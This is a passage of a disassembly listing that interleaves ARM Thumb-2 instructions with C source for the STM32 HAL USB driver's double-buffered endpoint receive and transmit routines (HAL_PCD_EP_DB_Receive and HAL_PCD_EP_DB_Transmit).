 8002c36:	d07c      	beq.n	8002d32 <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002c38:	68fb      	ldr	r3, [r7, #12]
 8002c3a:	681b      	ldr	r3, [r3, #0]
 8002c3c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c40:	b29b      	uxth	r3, r3
 8002c42:	461a      	mov	r2, r3
 8002c44:	68bb      	ldr	r3, [r7, #8]
 8002c46:	781b      	ldrb	r3, [r3, #0]
 8002c48:	00db      	lsls	r3, r3, #3
 8002c4a:	4413      	add	r3, r2
 8002c4c:	68fa      	ldr	r2, [r7, #12]
 8002c4e:	6812      	ldr	r2, [r2, #0]
 8002c50:	4413      	add	r3, r2
 8002c52:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002c56:	881b      	ldrh	r3, [r3, #0]
 8002c58:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c5c:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002c5e:	68bb      	ldr	r3, [r7, #8]
 8002c60:	699a      	ldr	r2, [r3, #24]
 8002c62:	8b7b      	ldrh	r3, [r7, #26]
 8002c64:	429a      	cmp	r2, r3
 8002c66:	d306      	bcc.n	8002c76 <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002c68:	68bb      	ldr	r3, [r7, #8]
 8002c6a:	699a      	ldr	r2, [r3, #24]
 8002c6c:	8b7b      	ldrh	r3, [r7, #26]
 8002c6e:	1ad2      	subs	r2, r2, r3
 8002c70:	68bb      	ldr	r3, [r7, #8]
 8002c72:	619a      	str	r2, [r3, #24]
 8002c74:	e002      	b.n	8002c7c <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002c76:	68bb      	ldr	r3, [r7, #8]
 8002c78:	2200      	movs	r2, #0
 8002c7a:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002c7c:	68bb      	ldr	r3, [r7, #8]
 8002c7e:	699b      	ldr	r3, [r3, #24]
 8002c80:	2b00      	cmp	r3, #0
 8002c82:	d123      	bne.n	8002ccc <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002c84:	68fb      	ldr	r3, [r7, #12]
 8002c86:	681b      	ldr	r3, [r3, #0]
 8002c88:	461a      	mov	r2, r3
 8002c8a:	68bb      	ldr	r3, [r7, #8]
 8002c8c:	781b      	ldrb	r3, [r3, #0]
 8002c8e:	009b      	lsls	r3, r3, #2
 8002c90:	4413      	add	r3, r2
 8002c92:	881b      	ldrh	r3, [r3, #0]
 8002c94:	b29b      	uxth	r3, r3
 8002c96:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002c9a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002c9e:	833b      	strh	r3, [r7, #24]
 8002ca0:	8b3b      	ldrh	r3, [r7, #24]
 8002ca2:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002ca6:	833b      	strh	r3, [r7, #24]
 8002ca8:	68fb      	ldr	r3, [r7, #12]
 8002caa:	681b      	ldr	r3, [r3, #0]
 8002cac:	461a      	mov	r2, r3
 8002cae:	68bb      	ldr	r3, [r7, #8]
 8002cb0:	781b      	ldrb	r3, [r3, #0]
 8002cb2:	009b      	lsls	r3, r3, #2
 8002cb4:	441a      	add	r2, r3
 8002cb6:	8b3b      	ldrh	r3, [r7, #24]
 8002cb8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002cbc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002cc0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002cc4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002cc8:	b29b      	uxth	r3, r3
 8002cca:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002ccc:	88fb      	ldrh	r3, [r7, #6]
 8002cce:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002cd2:	2b00      	cmp	r3, #0
 8002cd4:	d01f      	beq.n	8002d16 <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002cd6:	68fb      	ldr	r3, [r7, #12]
 8002cd8:	681b      	ldr	r3, [r3, #0]
 8002cda:	461a      	mov	r2, r3
 8002cdc:	68bb      	ldr	r3, [r7, #8]
 8002cde:	781b      	ldrb	r3, [r3, #0]
 8002ce0:	009b      	lsls	r3, r3, #2
 8002ce2:	4413      	add	r3, r2
 8002ce4:	881b      	ldrh	r3, [r3, #0]
 8002ce6:	b29b      	uxth	r3, r3
 8002ce8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002cec:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002cf0:	82fb      	strh	r3, [r7, #22]
 8002cf2:	68fb      	ldr	r3, [r7, #12]
 8002cf4:	681b      	ldr	r3, [r3, #0]
 8002cf6:	461a      	mov	r2, r3
 8002cf8:	68bb      	ldr	r3, [r7, #8]
 8002cfa:	781b      	ldrb	r3, [r3, #0]
 8002cfc:	009b      	lsls	r3, r3, #2
 8002cfe:	441a      	add	r2, r3
 8002d00:	8afb      	ldrh	r3, [r7, #22]
 8002d02:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002d06:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002d0a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002d0e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002d12:	b29b      	uxth	r3, r3
 8002d14:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002d16:	8b7b      	ldrh	r3, [r7, #26]
 8002d18:	2b00      	cmp	r3, #0
 8002d1a:	f000 8085 	beq.w	8002e28 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002d1e:	68fb      	ldr	r3, [r7, #12]
 8002d20:	6818      	ldr	r0, [r3, #0]
 8002d22:	68bb      	ldr	r3, [r7, #8]
 8002d24:	6959      	ldr	r1, [r3, #20]
 8002d26:	68bb      	ldr	r3, [r7, #8]
 8002d28:	891a      	ldrh	r2, [r3, #8]
 8002d2a:	8b7b      	ldrh	r3, [r7, #26]
 8002d2c:	f005 fb73 	bl	8008416 <USB_ReadPMA>
 8002d30:	e07a      	b.n	8002e28 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002d32:	68fb      	ldr	r3, [r7, #12]
 8002d34:	681b      	ldr	r3, [r3, #0]
 8002d36:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d3a:	b29b      	uxth	r3, r3
 8002d3c:	461a      	mov	r2, r3
 8002d3e:	68bb      	ldr	r3, [r7, #8]
 8002d40:	781b      	ldrb	r3, [r3, #0]
 8002d42:	00db      	lsls	r3, r3, #3
 8002d44:	4413      	add	r3, r2
 8002d46:	68fa      	ldr	r2, [r7, #12]
 8002d48:	6812      	ldr	r2, [r2, #0]
 8002d4a:	4413      	add	r3, r2
 8002d4c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002d50:	881b      	ldrh	r3, [r3, #0]
 8002d52:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002d56:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002d58:	68bb      	ldr	r3, [r7, #8]
 8002d5a:	699a      	ldr	r2, [r3, #24]
 8002d5c:	8b7b      	ldrh	r3, [r7, #26]
 8002d5e:	429a      	cmp	r2, r3
 8002d60:	d306      	bcc.n	8002d70 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002d62:	68bb      	ldr	r3, [r7, #8]
 8002d64:	699a      	ldr	r2, [r3, #24]
 8002d66:	8b7b      	ldrh	r3, [r7, #26]
 8002d68:	1ad2      	subs	r2, r2, r3
 8002d6a:	68bb      	ldr	r3, [r7, #8]
 8002d6c:	619a      	str	r2, [r3, #24]
 8002d6e:	e002      	b.n	8002d76 <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002d70:	68bb      	ldr	r3, [r7, #8]
 8002d72:	2200      	movs	r2, #0
 8002d74:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002d76:	68bb      	ldr	r3, [r7, #8]
 8002d78:	699b      	ldr	r3, [r3, #24]
 8002d7a:	2b00      	cmp	r3, #0
 8002d7c:	d123      	bne.n	8002dc6 <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002d7e:	68fb      	ldr	r3, [r7, #12]
 8002d80:	681b      	ldr	r3, [r3, #0]
 8002d82:	461a      	mov	r2, r3
 8002d84:	68bb      	ldr	r3, [r7, #8]
 8002d86:	781b      	ldrb	r3, [r3, #0]
 8002d88:	009b      	lsls	r3, r3, #2
 8002d8a:	4413      	add	r3, r2
 8002d8c:	881b      	ldrh	r3, [r3, #0]
 8002d8e:	b29b      	uxth	r3, r3
 8002d90:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002d94:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d98:	83fb      	strh	r3, [r7, #30]
 8002d9a:	8bfb      	ldrh	r3, [r7, #30]
 8002d9c:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002da0:	83fb      	strh	r3, [r7, #30]
 8002da2:	68fb      	ldr	r3, [r7, #12]
 8002da4:	681b      	ldr	r3, [r3, #0]
 8002da6:	461a      	mov	r2, r3
 8002da8:	68bb      	ldr	r3, [r7, #8]
 8002daa:	781b      	ldrb	r3, [r3, #0]
 8002dac:	009b      	lsls	r3, r3, #2
 8002dae:	441a      	add	r2, r3
 8002db0:	8bfb      	ldrh	r3, [r7, #30]
 8002db2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002db6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002dba:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002dbe:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002dc2:	b29b      	uxth	r3, r3
 8002dc4:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 8002dc6:	88fb      	ldrh	r3, [r7, #6]
 8002dc8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002dcc:	2b00      	cmp	r3, #0
 8002dce:	d11f      	bne.n	8002e10 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002dd0:	68fb      	ldr	r3, [r7, #12]
 8002dd2:	681b      	ldr	r3, [r3, #0]
 8002dd4:	461a      	mov	r2, r3
 8002dd6:	68bb      	ldr	r3, [r7, #8]
 8002dd8:	781b      	ldrb	r3, [r3, #0]
 8002dda:	009b      	lsls	r3, r3, #2
 8002ddc:	4413      	add	r3, r2
 8002dde:	881b      	ldrh	r3, [r3, #0]
 8002de0:	b29b      	uxth	r3, r3
 8002de2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002de6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002dea:	83bb      	strh	r3, [r7, #28]
 8002dec:	68fb      	ldr	r3, [r7, #12]
 8002dee:	681b      	ldr	r3, [r3, #0]
 8002df0:	461a      	mov	r2, r3
 8002df2:	68bb      	ldr	r3, [r7, #8]
 8002df4:	781b      	ldrb	r3, [r3, #0]
 8002df6:	009b      	lsls	r3, r3, #2
 8002df8:	441a      	add	r2, r3
 8002dfa:	8bbb      	ldrh	r3, [r7, #28]
 8002dfc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e00:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e04:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e08:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002e0c:	b29b      	uxth	r3, r3
 8002e0e:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002e10:	8b7b      	ldrh	r3, [r7, #26]
 8002e12:	2b00      	cmp	r3, #0
 8002e14:	d008      	beq.n	8002e28 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002e16:	68fb      	ldr	r3, [r7, #12]
 8002e18:	6818      	ldr	r0, [r3, #0]
 8002e1a:	68bb      	ldr	r3, [r7, #8]
 8002e1c:	6959      	ldr	r1, [r3, #20]
 8002e1e:	68bb      	ldr	r3, [r7, #8]
 8002e20:	895a      	ldrh	r2, [r3, #10]
 8002e22:	8b7b      	ldrh	r3, [r7, #26]
 8002e24:	f005 faf7 	bl	8008416 <USB_ReadPMA>
    }
  }

  return count;
 8002e28:	8b7b      	ldrh	r3, [r7, #26]
}
 8002e2a:	4618      	mov	r0, r3
 8002e2c:	3720      	adds	r7, #32
 8002e2e:	46bd      	mov	sp, r7
 8002e30:	bd80      	pop	{r7, pc}

08002e32 <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002e32:	b580      	push	{r7, lr}
 8002e34:	b0a4      	sub	sp, #144	; 0x90
 8002e36:	af00      	add	r7, sp, #0
 8002e38:	60f8      	str	r0, [r7, #12]
 8002e3a:	60b9      	str	r1, [r7, #8]
 8002e3c:	4613      	mov	r3, r2
 8002e3e:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002e40:	88fb      	ldrh	r3, [r7, #6]
 8002e42:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002e46:	2b00      	cmp	r3, #0
 8002e48:	f000 81db 	beq.w	8003202 <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002e4c:	68fb      	ldr	r3, [r7, #12]
 8002e4e:	681b      	ldr	r3, [r3, #0]
 8002e50:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002e54:	b29b      	uxth	r3, r3
 8002e56:	461a      	mov	r2, r3
 8002e58:	68bb      	ldr	r3, [r7, #8]
 8002e5a:	781b      	ldrb	r3, [r3, #0]
 8002e5c:	00db      	lsls	r3, r3, #3
 8002e5e:	4413      	add	r3, r2
 8002e60:	68fa      	ldr	r2, [r7, #12]
 8002e62:	6812      	ldr	r2, [r2, #0]
 8002e64:	4413      	add	r3, r2
 8002e66:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002e6a:	881b      	ldrh	r3, [r3, #0]
 8002e6c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e70:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 8002e74:	68bb      	ldr	r3, [r7, #8]
 8002e76:	699a      	ldr	r2, [r3, #24]
 8002e78:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002e7c:	429a      	cmp	r2, r3
 8002e7e:	d907      	bls.n	8002e90 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8002e80:	68bb      	ldr	r3, [r7, #8]
 8002e82:	699a      	ldr	r2, [r3, #24]
 8002e84:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002e88:	1ad2      	subs	r2, r2, r3
 8002e8a:	68bb      	ldr	r3, [r7, #8]
 8002e8c:	619a      	str	r2, [r3, #24]
 8002e8e:	e002      	b.n	8002e96 <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8002e90:	68bb      	ldr	r3, [r7, #8]
 8002e92:	2200      	movs	r2, #0
 8002e94:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 8002e96:	68bb      	ldr	r3, [r7, #8]
 8002e98:	699b      	ldr	r3, [r3, #24]
 8002e9a:	2b00      	cmp	r3, #0
 8002e9c:	f040 80b9 	bne.w	8003012 <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002ea0:	68bb      	ldr	r3, [r7, #8]
 8002ea2:	785b      	ldrb	r3, [r3, #1]
 8002ea4:	2b00      	cmp	r3, #0
 8002ea6:	d126      	bne.n	8002ef6 <HAL_PCD_EP_DB_Transmit+0xc4>
 8002ea8:	68fb      	ldr	r3, [r7, #12]
 8002eaa:	681b      	ldr	r3, [r3, #0]
 8002eac:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002eae:	68fb      	ldr	r3, [r7, #12]
 8002eb0:	681b      	ldr	r3, [r3, #0]
 8002eb2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002eb6:	b29b      	uxth	r3, r3
 8002eb8:	461a      	mov	r2, r3
 8002eba:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002ebc:	4413      	add	r3, r2
 8002ebe:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002ec0:	68bb      	ldr	r3, [r7, #8]
 8002ec2:	781b      	ldrb	r3, [r3, #0]
 8002ec4:	00da      	lsls	r2, r3, #3
 8002ec6:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002ec8:	4413      	add	r3, r2
 8002eca:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002ece:	62bb      	str	r3, [r7, #40]	; 0x28
 8002ed0:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002ed2:	881b      	ldrh	r3, [r3, #0]
 8002ed4:	b29b      	uxth	r3, r3
 8002ed6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002eda:	b29a      	uxth	r2, r3
 8002edc:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002ede:	801a      	strh	r2, [r3, #0]
 8002ee0:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002ee2:	881b      	ldrh	r3, [r3, #0]
 8002ee4:	b29b      	uxth	r3, r3
 8002ee6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002eea:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002eee:	b29a      	uxth	r2, r3
 8002ef0:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002ef2:	801a      	strh	r2, [r3, #0]
 8002ef4:	e01a      	b.n	8002f2c <HAL_PCD_EP_DB_Transmit+0xfa>
 8002ef6:	68bb      	ldr	r3, [r7, #8]
 8002ef8:	785b      	ldrb	r3, [r3, #1]
 8002efa:	2b01      	cmp	r3, #1
 8002efc:	d116      	bne.n	8002f2c <HAL_PCD_EP_DB_Transmit+0xfa>
 8002efe:	68fb      	ldr	r3, [r7, #12]
 8002f00:	681b      	ldr	r3, [r3, #0]
 8002f02:	637b      	str	r3, [r7, #52]	; 0x34
 8002f04:	68fb      	ldr	r3, [r7, #12]
 8002f06:	681b      	ldr	r3, [r3, #0]
 8002f08:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f0c:	b29b      	uxth	r3, r3
 8002f0e:	461a      	mov	r2, r3
 8002f10:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002f12:	4413      	add	r3, r2
 8002f14:	637b      	str	r3, [r7, #52]	; 0x34
 8002f16:	68bb      	ldr	r3, [r7, #8]
 8002f18:	781b      	ldrb	r3, [r3, #0]
 8002f1a:	00da      	lsls	r2, r3, #3
 8002f1c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002f1e:	4413      	add	r3, r2
 8002f20:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f24:	633b      	str	r3, [r7, #48]	; 0x30
 8002f26:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002f28:	2200      	movs	r2, #0
 8002f2a:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002f2c:	68fb      	ldr	r3, [r7, #12]
 8002f2e:	681b      	ldr	r3, [r3, #0]
 8002f30:	627b      	str	r3, [r7, #36]	; 0x24
 8002f32:	68bb      	ldr	r3, [r7, #8]
 8002f34:	785b      	ldrb	r3, [r3, #1]
 8002f36:	2b00      	cmp	r3, #0
 8002f38:	d126      	bne.n	8002f88 <HAL_PCD_EP_DB_Transmit+0x156>
 8002f3a:	68fb      	ldr	r3, [r7, #12]
 8002f3c:	681b      	ldr	r3, [r3, #0]
 8002f3e:	61fb      	str	r3, [r7, #28]
 8002f40:	68fb      	ldr	r3, [r7, #12]
 8002f42:	681b      	ldr	r3, [r3, #0]
 8002f44:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f48:	b29b      	uxth	r3, r3
 8002f4a:	461a      	mov	r2, r3
 8002f4c:	69fb      	ldr	r3, [r7, #28]
 8002f4e:	4413      	add	r3, r2
 8002f50:	61fb      	str	r3, [r7, #28]
 8002f52:	68bb      	ldr	r3, [r7, #8]
 8002f54:	781b      	ldrb	r3, [r3, #0]
 8002f56:	00da      	lsls	r2, r3, #3
 8002f58:	69fb      	ldr	r3, [r7, #28]
 8002f5a:	4413      	add	r3, r2
 8002f5c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002f60:	61bb      	str	r3, [r7, #24]
 8002f62:	69bb      	ldr	r3, [r7, #24]
 8002f64:	881b      	ldrh	r3, [r3, #0]
 8002f66:	b29b      	uxth	r3, r3
 8002f68:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f6c:	b29a      	uxth	r2, r3
 8002f6e:	69bb      	ldr	r3, [r7, #24]
 8002f70:	801a      	strh	r2, [r3, #0]
 8002f72:	69bb      	ldr	r3, [r7, #24]
 8002f74:	881b      	ldrh	r3, [r3, #0]
 8002f76:	b29b      	uxth	r3, r3
 8002f78:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002f7c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002f80:	b29a      	uxth	r2, r3
 8002f82:	69bb      	ldr	r3, [r7, #24]
 8002f84:	801a      	strh	r2, [r3, #0]
 8002f86:	e017      	b.n	8002fb8 <HAL_PCD_EP_DB_Transmit+0x186>
 8002f88:	68bb      	ldr	r3, [r7, #8]
 8002f8a:	785b      	ldrb	r3, [r3, #1]
 8002f8c:	2b01      	cmp	r3, #1
 8002f8e:	d113      	bne.n	8002fb8 <HAL_PCD_EP_DB_Transmit+0x186>
 8002f90:	68fb      	ldr	r3, [r7, #12]
 8002f92:	681b      	ldr	r3, [r3, #0]
 8002f94:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f98:	b29b      	uxth	r3, r3
 8002f9a:	461a      	mov	r2, r3
 8002f9c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002f9e:	4413      	add	r3, r2
 8002fa0:	627b      	str	r3, [r7, #36]	; 0x24
 8002fa2:	68bb      	ldr	r3, [r7, #8]
 8002fa4:	781b      	ldrb	r3, [r3, #0]
 8002fa6:	00da      	lsls	r2, r3, #3
 8002fa8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002faa:	4413      	add	r3, r2
 8002fac:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002fb0:	623b      	str	r3, [r7, #32]
 8002fb2:	6a3b      	ldr	r3, [r7, #32]
 8002fb4:	2200      	movs	r2, #0
 8002fb6:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002fb8:	68bb      	ldr	r3, [r7, #8]
 8002fba:	781b      	ldrb	r3, [r3, #0]
 8002fbc:	4619      	mov	r1, r3
 8002fbe:	68f8      	ldr	r0, [r7, #12]
 8002fc0:	f009 fc49 	bl	800c856 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002fc4:	88fb      	ldrh	r3, [r7, #6]
 8002fc6:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002fca:	2b00      	cmp	r3, #0
 8002fcc:	f000 82fa 	beq.w	80035c4 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8002fd0:	68fb      	ldr	r3, [r7, #12]
 8002fd2:	681b      	ldr	r3, [r3, #0]
 8002fd4:	461a      	mov	r2, r3
 8002fd6:	68bb      	ldr	r3, [r7, #8]
 8002fd8:	781b      	ldrb	r3, [r3, #0]
 8002fda:	009b      	lsls	r3, r3, #2
 8002fdc:	4413      	add	r3, r2
 8002fde:	881b      	ldrh	r3, [r3, #0]
 8002fe0:	b29b      	uxth	r3, r3
 8002fe2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002fe6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002fea:	82fb      	strh	r3, [r7, #22]
 8002fec:	68fb      	ldr	r3, [r7, #12]
 8002fee:	681b      	ldr	r3, [r3, #0]
 8002ff0:	461a      	mov	r2, r3
 8002ff2:	68bb      	ldr	r3, [r7, #8]
 8002ff4:	781b      	ldrb	r3, [r3, #0]
 8002ff6:	009b      	lsls	r3, r3, #2
 8002ff8:	441a      	add	r2, r3
 8002ffa:	8afb      	ldrh	r3, [r7, #22]
 8002ffc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003000:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003004:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003008:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800300c:	b29b      	uxth	r3, r3
 800300e:	8013      	strh	r3, [r2, #0]
 8003010:	e2d8      	b.n	80035c4 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003012:	88fb      	ldrh	r3, [r7, #6]
 8003014:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003018:	2b00      	cmp	r3, #0
 800301a:	d021      	beq.n	8003060 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 800301c:	68fb      	ldr	r3, [r7, #12]
 800301e:	681b      	ldr	r3, [r3, #0]
 8003020:	461a      	mov	r2, r3
 8003022:	68bb      	ldr	r3, [r7, #8]
 8003024:	781b      	ldrb	r3, [r3, #0]
 8003026:	009b      	lsls	r3, r3, #2
 8003028:	4413      	add	r3, r2
 800302a:	881b      	ldrh	r3, [r3, #0]
 800302c:	b29b      	uxth	r3, r3
 800302e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003032:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003036:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800303a:	68fb      	ldr	r3, [r7, #12]
 800303c:	681b      	ldr	r3, [r3, #0]
 800303e:	461a      	mov	r2, r3
 8003040:	68bb      	ldr	r3, [r7, #8]
 8003042:	781b      	ldrb	r3, [r3, #0]
 8003044:	009b      	lsls	r3, r3, #2
 8003046:	441a      	add	r2, r3
 8003048:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800304c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003050:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003054:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003058:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800305c:	b29b      	uxth	r3, r3
 800305e:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003060:	68bb      	ldr	r3, [r7, #8]
 8003062:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8003066:	2b01      	cmp	r3, #1
 8003068:	f040 82ac 	bne.w	80035c4 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 800306c:	68bb      	ldr	r3, [r7, #8]
 800306e:	695a      	ldr	r2, [r3, #20]
 8003070:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003074:	441a      	add	r2, r3
 8003076:	68bb      	ldr	r3, [r7, #8]
 8003078:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 800307a:	68bb      	ldr	r3, [r7, #8]
 800307c:	69da      	ldr	r2, [r3, #28]
 800307e:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
